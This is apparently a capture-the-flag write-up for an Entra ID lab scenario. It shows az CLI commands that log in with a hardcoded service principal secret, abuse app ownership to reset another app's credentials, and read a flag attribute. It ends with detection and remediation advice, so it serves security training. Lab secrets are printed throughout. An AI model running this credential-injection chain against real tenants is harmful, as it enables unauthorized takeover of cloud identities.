---
title: "EntraGoat: Application Ownership Chain and Credential Bypass"
date: 2026-05-14 00:06:00 +0000
categories: [Azure, Pentesting]
tags: [azure, entra-id, app-ownership, credential-injection, entragoat, service-principal]
---

## Overview

**Scenario:** CBA - Certificate Bypass Authority  
**Technique:** Hardcoded SP Credentials → App Ownership Abuse → Credential Addition → Flag Read  
**Initial Access:** Service Principal of the Legacy-Automation-Service app  
**Outcome:** Authenticated as DataSync-Production SP → read flag from extensionAttribute1  
**Flag:** `EntraGoat{C3rt_Byp@ss_R00t3d_4dm1n}`

---

## Attack Chain

```
Source code repository review
        ↓
Hardcoded SP credentials in legacy_sync_task.ps1
        ↓
Authenticate as Legacy-Automation-Service
        ↓
Application.ReadWrite.OwnedBy → owns DataSync-Production
        ↓
az ad sp credential reset → add credentials to DataSync-Production
        ↓
Authenticate as DataSync-Production
        ↓
Organization.ReadWrite.All + Directory.Read.All
        ↓
Read flag from extensionAttribute1
```

---

## Step 1- Initial Access: Hardcoded Credentials

Scenario premise: reviewing an old PowerShell repository, found hardcoded credentials in `legacy_sync_task.ps1`:

```powershell
PS C:\users\flare\entragoat\scenarios> ./EntraGoat-Scenario6-Setup.ps1
|         ENTRAGOAT SCENARIO 6 - SETUP INITIALIZATION          |
|   CBA (Certificate Bypass Authority)  Root Access Granted    |
|--------------------------------------------------------------|


ATTACKER CREDENTIALS:
----------------------------
  Password: TheGoatAccess!123

TARGET:
----------------------------
  Flag Location: extensionAttribute1

While reviewing an old PowerShell repo, you stumbled upon a
hardcoded secret in a script called 'legacy_sync_task.ps1':

    # TODO: Move this to Key Vault someday
    $clientId = 'd634139b-ff98-4361-997c-8d46c7e34b92'
    $clientSecret = 'Hkz8Q~_0c5h3TJKb21dovDAOJOYA4yCwlgohPc9d'
    $tenantId = '97b...'

The commit message says: 'Legacy auth policy automation - DO NOT DELETE'

[+] Scenario 6 setup completed successfully.

Objective: Sign in as the admin user and retrieve the flag.

Hint: That dusty old automation secret? Forgotten by devs, remembered by the backend.


Setup process for Scenario 6 complete.
=====================================================
```



Authenticated as the service principal:

```bash
az login --service-principal -u "d634139b-ff98-4361-997c-8d46c7e34b92" -p "Hkz8Q~_0c5h3TJKb21dovDAOJOYA4yCwlgohPc9d" --tenant "97b0.......a3" --allow-no-subscriptions
```

SP authenticated as `Legacy-Automation-Service`.

---

## Step 2 - Enumeration

Listed tenant app registrations:

```bash
 az ad app list --query "[].{Name:displayName, AppID:appId, ObjectID:id}" --output table
Name                         AppID                                 ObjectID
---------------------------  ------------------------------------  ------------------------------------
DataSync-Production          58680b33-0e6f-4e5a-965c-cb34909b2f43  0470b564-21be-43ab-855b-00a96cff037c
Organization-Config-Manager  b306d82f-946d-4a29-affa-a00e249c9e60  50824b49-e02a-41b5-8636-fd9b7f24c237
Legacy-Automation-Service    d634139b-ff98-4361-997c-8d46c7e34b92  ddbb3165-76ae-48fb-8d88-7ad749491f28
```

Three apps found:
- `DataSync-Production` (appId: `58680b33`)
- `Organization-Config-Manager` (appId: `b306d82f`)
- `Legacy-Automation-Service` (appId: `d634139b`) - our SP

Resolved the correct SP object ID for Legacy-Automation-Service (the appId returns 404 on SP endpoints, need the object ID):

```powershell
PS C:\users\flare\entragoat\scenarios> az ad sp show --id  d634139b-ff98-4361-997c-8d46c7e34b92 --query id -o tsv
1cb38d86-6857-44fc-b4f9-c3c13ae28a09

```

Checked app role assignments for Legacy-Automation-Service:

```bash
az rest --method GET --url 'https://graph.microsoft.com/v1.0/servicePrincipals/1cb38d86-6857-44fc-b4f9-c3c13ae28a09/appRoleAssignments'
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#appRoleAssignments",
  "value": [
    {
      "appRoleId": "18a4783c-866b-4cc7-a460-3d5e5662c884",
      "createdDateTime": "2026-05-13T13:26:00.487872Z",
      "deletedDateTime": null,
      "id": "ho2zHFdo_ES0-cPBOuKKCVB9_HJQPolEk4qzTT5S43Q",
      "principalDisplayName": "Legacy-Automation-Service",
      "principalId": "1cb38d86-6857-44fc-b4f9-c3c13ae28a09",
      "principalType": "ServicePrincipal",
      "resourceDisplayName": "Microsoft Graph",
      "resourceId": "216e59bf-6c38-42b9-9211-734fe4d2f3bb"
    },
    {
      "appRoleId": "7ab1d382-f21e-4acd-a863-ba3e13f7da61",
      "createdDateTime": "2026-05-13T13:25:55.0917984Z",
      "deletedDateTime": null,
      "id": "ho2zHFdo_ES0-cPBOuKKCVhxl0cSFGdDuHrDxt5xWfI",
      "principalDisplayName": "Legacy-Automation-Service",
      "principalId": "1cb38d86-6857-44fc-b4f9-c3c13ae28a09",
      "principalType": "ServicePrincipal",
      "resourceDisplayName": "Microsoft Graph",
      "resourceId": "216e59bf-6c38-42b9-9211-734fe4d2f3bb"
    }
  ]
}
```

Permissions found:
- `18a4783c-866b-4cc7-a460-3d5e5662c884` → **Application.ReadWrite.OwnedBy**
- `7ab1d382-f21e-4acd-a863-ba3e13f7da61` → **Directory.Read.All**

`Application.ReadWrite.OwnedBy` allows adding credentials to apps the SP owns.

Checked owned objects:

```bash
PS C:\users\flare\entragoat\scenarios> az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/1cb38d86-6857-44fc-b4f9-c3c13ae28a09/ownedObjects"
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#directoryObjects",
  "value": [
    {
      "@odata.type": "#microsoft.graph.application",
      "addIns": [],
      "api": {
        "acceptMappedClaims": null,
        "knownClientApplications": [],
        "oauth2PermissionScopes": [],
        "preAuthorizedApplications": [],
        "requestedAccessTokenVersion": null
      },
      "appId": "58680b33-0e6f-4e5a-965c-cb34909b2f43",
      "appRoles": [],
      "applicationTemplateId": null,
      "certification": null,
      "createdByAppId": "14d82eec-204b-4c2f-b7e8-296a70dab67e",
      "createdDateTime": "2026-05-13T13:26:06Z",
      "defaultRedirectUri": null,
      "deletedDateTime": null,
      "description": "Production data synchronization service",
      "disabledByMicrosoftStatus": null,
      "displayName": "DataSync-Production",
      "groupMembershipClaims": null,
      "id": "0470b564-21be-43ab-855b-00a96cff037c",
      "identifierUris": [],
      "info": {
        "logoUrl": null,
        "marketingUrl": null,
        "privacyStatementUrl": null,
        "supportUrl": null,
        "termsOfServiceUrl": null
....
....
...
    {
      "@odata.type": "#microsoft.graph.servicePrincipal",
      "accountEnabled": true,
      "addIns": [],
      "alternativeNames": [],
      "appDescription": "Production data synchronization service",
      "appDisplayName": "DataSync-Production",
      "appId": "58680b33-0e6f-4e5a-965c-cb34909b2f43",
      "appOwnerOrganizationId": "97b...",
      "appRoleAssignmentRequired": false,
      "appRoles": [],
      "applicationTemplateId": null,
      "createdByAppId": "14d82eec-204b-4c2f-b7e8-296a70dab67e",
      "createdDateTime": "2026-05-13T13:26:11Z",
      "deletedDateTime": null,
      "disabledByMicrosoftStatus": null,
      "displayName": "DataSync-Production",
      "id": "c22216a5-842a-4ad1-a1e4-bffa3b0940c7",
      "info": {
        "logoUrl": null,
        "marketingUrl": null,
        "privacyStatementUrl": null,
        "supportUrl": null,
        "termsOfServiceUrl": null
      },
      "isDisabled": null,
      "keyCredentials": [],
      "loginUrl": null,
      "logoutUrl": null,
      "notes": null,
      "notificationEmailAddresses": [],
      "oauth2PermissionScopes": [],
      "passwordCredentials": [],
      "preferredSingleSignOnMode": null,
      "preferredTokenSigningKeyThumbprint": null,
      "replyUrls": [],
      "resourceSpecificApplicationPermissions": [],
      "samlSingleSignOnSettings": null,
      "servicePrincipalNames": [
        "58680b33-0e6f-4e5a-965c-cb34909b2f43"
      ],
      "servicePrincipalType": "Application",
      "signInAudience": "AzureADMyOrg",
      "tags": [
      ],
      "verifiedPublisher": {
        "addedDateTime": null,
        "displayName": null,
        "verifiedPublisherId": null
      }
    }
  ]
}
```

Legacy-Automation-Service owns **DataSync-Production** (app object ID: `0470b564`, SP object ID: `c22216a5`).

Checked DataSync-Production's permissions:

```bash
PS C:\users\flare\entragoat\scenarios> az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/c22216a5-842a-4ad1-a1e4-bffa3b0940c7/appRoleAssignments"
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#appRoleAssignments",
  "value": [
    {
      "appRoleId": "7ab1d382-f21e-4acd-a863-ba3e13f7da61",
      "createdDateTime": "2026-05-13T13:26:23.4836144Z",
      "deletedDateTime": null,
      "id": "pRYiwiqE0Uqh5L_6OwlAx-yg5sTECD1KhQIK__E4OLQ",
      "principalDisplayName": "DataSync-Production",
      "principalId": "c22216a5-842a-4ad1-a1e4-bffa3b0940c7",
      "principalType": "ServicePrincipal",
      "resourceDisplayName": "Microsoft Graph",
    },
    {
      "appRoleId": "292d869f-3427-49a8-9dab-8c70152b74e9",
      "createdDateTime": "2026-05-13T13:26:18.0711226Z",
      "deletedDateTime": null,
      "id": "pRYiwiqE0Uqh5L_6OwlAxw7Trxc1WjVHnuBvLtxbDt8",
      "principalDisplayName": "DataSync-Production",
      "principalId": "c22216a5-842a-4ad1-a1e4-bffa3b0940c7",
      "principalType": "ServicePrincipal",
      "resourceDisplayName": "Microsoft Graph",
      "resourceId": "216e59bf-6c38-42b9-9211-734fe4d2f3bb"
    }
  ]
}
```

DataSync-Production has:
- `292d869f-3427-49a8-9dab-8c70152b74e9` → **Organization.ReadWrite.All**
- `7ab1d382-f21e-4acd-a863-ba3e13f7da61` → **Directory.Read.All**

`Directory.Read.All` is sufficient to read extensionAttribute1 from any user.

---

## Step 3 - Credential Addition to Owned App

Used `az ad sp credential reset` to add credentials to DataSync-Production:

```bash
az ad sp credential reset --id c22216a5-842a-4ad1-a1e4-bffa3b0940c7
```

Output:
```json
{
  "appId": "58680b33-0e6f-4e5a-965c-cb34909b2f43",
  "password": "cK38Q~KqFXSzSuM_p7qMutiOZ66Mec7RwrakGdvc",
  "tenant": "97......ea3"
}
```



---

## Step 4 - Authenticate as DataSync-Production

```powershell
az login --service-principal -u "58680b33-0e6f-4e5a-965c-cb34909b2f43" -p "cK38Q~KqFXSzSuM_p7qMutiOZ66Mec7RwrakGdvc" --tenant "97b..." --allow-no-subscriptions
```

Authenticated as DataSync-Production with `Organization.ReadWrite.All` and `Directory.Read.All`.

---

## Step 5 - Flag Retrieval

```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/users/EntraGoat-admin-s6@REDACTED.onmicrosoft.com?\$select=onPremisesExtensionAttributes"
```

**Flag:** `EntraGoat{C3rt_Byp@ss_R00t3d_4dm1n}`

---

## Key Takeaways

**Why this works:**
- Hardcoded credentials in source code are a critical finding, service accounts are often over-privileged and never rotated
- `Application.ReadWrite.OwnedBy` is a targeted but dangerous permission  it scopes write access only to owned apps, making it appear lower risk than `Application.ReadWrite.All`, but in practice it allows credential injection into any app the SP owns
- App ownership chains allow lateral movement between service principals without any directory role assignment
- `Directory.Read.All` is sufficient to read sensitive attributes like extensionAttribute1 which EntraGoat uses to store flags, in real environments these attributes often contain sensitive configuration data

**Detection opportunities:**
- Service principal credential additions/resets - `Update application - Certificates and secrets management` in Entra audit logs
- Authentication from service principals with no recent sign-in history
- `Directory.Read.All` or `Organization.ReadWrite.All` application permissions granted to automation SPs
- Access to extensionAttribute properties on privileged accounts outside expected service accounts
- Hardcoded credentials found via SAST tooling or secret scanning (truffleHog, git-secrets)

**Remediation:**
- Never store credentials in source code  use Key Vault or managed identity
- Rotate all secrets that may have been committed to version control
- Review app ownership assignments `Application.ReadWrite.OwnedBy` on a SP that owns a privileged app is equivalent to owning that app's credentials
- Audit what each service principal can reach via its owned objects, not just its direct permissions
- Enable credential change alerts in Entra ID
